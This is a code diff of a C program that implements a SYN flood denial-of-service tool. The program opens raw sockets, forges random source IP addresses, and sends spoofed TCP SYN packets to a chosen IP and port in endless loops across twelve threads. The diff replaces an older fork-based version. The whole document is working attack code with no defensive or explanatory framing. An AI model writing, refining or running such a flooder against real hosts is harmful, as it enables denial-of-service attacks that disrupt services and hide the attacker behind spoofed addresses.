@@ -1,87 +1,105 @@
 #include "protocol.h"
 
+#define TH_N 12
+
+struct thread_arg
+{
+    int sock;
+    struct sockaddr_in *t_addr;
+};
+
+int make_socket();
+void make_packet(struct tcp_packet *packet, struct sockaddr_in *addr);
+void attack(int sock, struct sockaddr_in *addr);
+void *synflood_thread_function(void *p);
+
+int syn_flood(char* ip, char *port) {
+    struct thread_arg th_arg[TH_N];
+    pthread_t thread_id[TH_N];
+    struct sockaddr_in t_addr;
+    int sock;
+    uint32_t t_ip;
+    int t_port;
+    
+    if((t_ip = inet_addr(ip))<0)
+    {
+        printf("IP error\n");
+        return -1;
+    }
+    t_port=atoi(port);
+    if(t_port<=0 || t_port>65535)
+    {
+        printf("Port error\n");
+        return -1;
+    }
+    srand((unsigned int)time(NULL));
+    
+    memset(&t_addr, 0 , sizeof(struct sockaddr_in));
+    t_addr.sin_addr.s_addr = t_ip;
+    t_addr.sin_port = htons((uint16_t)t_port);
+    t_addr.sin_family = AF_INET;
+
+    for(int n = 0 ; n<TH_N ; n++)
+    {
+        th_arg[n].sock = make_socket();
+        th_arg[n].t_addr = &t_addr;
+        pthread_create(&thread_id[n], NULL, synflood_thread_function, &th_arg[n]);
+    }
+
+    sock = make_socket();
+    attack(sock, &t_addr);
+
+	return 0;
+}
+
 int make_socket()
 {
     int sock;
     int on =1;
+
     if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)  
     {
         perror("socket ");
-        return 1;
+        return -1;
     }
     if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
     {
         perror("setsockopt ");
         return -1;
     }
+    
     return sock;
 }
 
 void make_packet(struct tcp_packet *packet, struct sockaddr_in *addr)
-{
-    srand((unsigned int)time(NULL));
-    
+{   
     struct in_addr ranip;
-    uint16_t ranport = rand();
-    uint32_t ranseq = rand();
+    static uint16_t port = 1024;
 
     ranip.s_addr = rand();
 
-    make_tcp_header_v2(&packet->tcphdr, ranip, ranport, addr->sin_addr, ntohs(addr->sin_port), ranseq, 0, TH_SYN);
+    make_tcp_header_v2(&packet->tcphdr, ranip, port, addr->sin_addr, ntohs(addr->sin_port), 0, 0, TH_SYN);
     make_ip_header_v2(&packet->iphdr, ranip, addr->sin_addr, sizeof(struct tcphdr));
+    port++;
 }
 
-#define CONNECTIONS 8
-#define THREADS 48
-
-void attack(struct sockaddr_in *t_addr, int id)
+void attack(int sock, struct sockaddr_in *addr)
 {
-	int sockets[CONNECTIONS];
-	int n, g=1, len;
     struct tcp_packet packet;
 
-    memset(&packet, 0 ,sizeof(struct tcp_packet));
+    memset(&packet, 0, sizeof(struct tcp_packet));
 
-	for(n=0; n!= CONNECTIONS; n++)
-		sockets[n]=0;
-	while(1) 
+    while(1)
     {
-		for(n=0; n != CONNECTIONS; n++)
-        {
-			if(sockets[n] == 0)
-			    sockets[n] = make_socket();
-
-            make_packet(&packet, t_addr);
-            len=sendto(sockets[n], &packet, sizeof(packet), 0, (struct sockaddr *)t_addr, sizeof(*t_addr));
-			if(len < 0)
-            {
-                perror("sendto");
-                close(sockets[n]);
-				sockets[n] = make_socket();
-            }
-            else
-			    printf("Socket[%i->%i] -> %i\n", n, sockets[n], len);
-			printf("[%i: Voly Sent]\n", id);
-		}
-		printf("[%i: Voly Sent]\n", id);
-		usleep(300000);
-	}
+        make_packet(&packet, addr);
+        
+		if(sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr *)addr, sizeof(struct sockaddr_in))<0)
+            perror("sendto");
+    }
 }
 
-int main(int argc, char **argv) {
-    int n;
-    struct sockaddr_in t_addr;
-
-    memset(&t_addr, 0 , sizeof(struct sockaddr_in));
-    t_addr.sin_addr.s_addr = inet_addr(argv[1]);
-    t_addr.sin_port = htons((uint16_t)atoi(argv[2]));
-    t_addr.sin_family = AF_INET;
-    
-    for(n=0; n != THREADS; n++) {
-		if(fork())
-			attack(&t_addr, n);
-		usleep(200000);
-	}
-	getc(stdin);
-	return 0;
+void *synflood_thread_function(void *p)
+{
+    struct thread_arg *arg = (struct thread_arg *)p;
+    attack(arg->sock, arg->t_addr);
 }
